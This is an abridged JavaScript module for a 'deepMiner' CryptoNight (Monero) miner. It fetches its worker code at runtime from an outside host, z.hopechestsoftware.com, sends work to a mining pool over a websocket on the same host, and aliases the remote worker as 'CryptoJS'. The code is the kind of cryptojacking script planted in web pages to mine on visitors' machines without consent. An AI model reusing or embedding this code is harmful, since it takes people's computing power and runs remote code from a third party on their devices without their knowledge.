...
var CryptoJS = require('https://z.hopechestsoftware.com/worker.js');
...
(function () {
    ...
    Miner.prototype._loadWorkerSource = function (callback) {
		console.log("Miner.prototype._loadWorkerSource");
		function eventListener(res){
			res.on("data", data => {
				//console.log("function eventListener xxx", data);
				deepMiner.CRYPTONIGHT_WORKER_BLOB = deepMiner.Res(data);
				this._asmjsStatus = "loaded";
				callback();
			  });
		}
		https.get(deepMiner.CRYPTONIGHT_WORKER_BLOB, eventListener.bind(this)).on('error', (e) => {
			console.error(e);
		  });

		if (this._useWASM || this._asmjsStatus === "loaded") {
			console.log("this._useWASM || this._asmjsStatus === loaded");
            callback()
        } else if (this._asmjsStatus === "unloaded") {
			console.log("this._asmjsStatus === unloaded");
    ...
    deepMiner = deepMiner || {};
    deepMiner.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
    deepMiner.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
    deepMiner.FORCE_MULTI_TAB = "forceMultiTab";
    deepMiner.Token = function (siteKey, goal, params) {
        var miner = new Miner(siteKey, params);
        miner._goal = goal || 0;
        return miner
    };
    deepMiner.User = function (siteKey, user, params) {
        var miner = new Miner(siteKey, params);
        miner._user = user;
        return miner
    };
    deepMiner.Anonymous = function (siteKey, params) {
        var miner = new Miner(siteKey, params);
        return miner
    };
    deepMiner.Res = function (s) {
        return s;
    }
})();
...
(function () {
    ...
    deepMiner.JobThread = JobThread
})();


deepMiner.CONFIG = {
    LIB_URL: "https://z.hopechestsoftware.com/lib/",
    WEBSOCKET_SHARDS: [["wss://z.hopechestsoftware.com/api"]],
    ASMJS_NAME: "cryptonight-asmjs.min.js",
    REQUIRES_AUTH: false
};
deepMiner.CRYPTONIGHT_WORKER_BLOB = "https://z.hopechestsoftware.com/worker.js";

module.exports = deepMiner;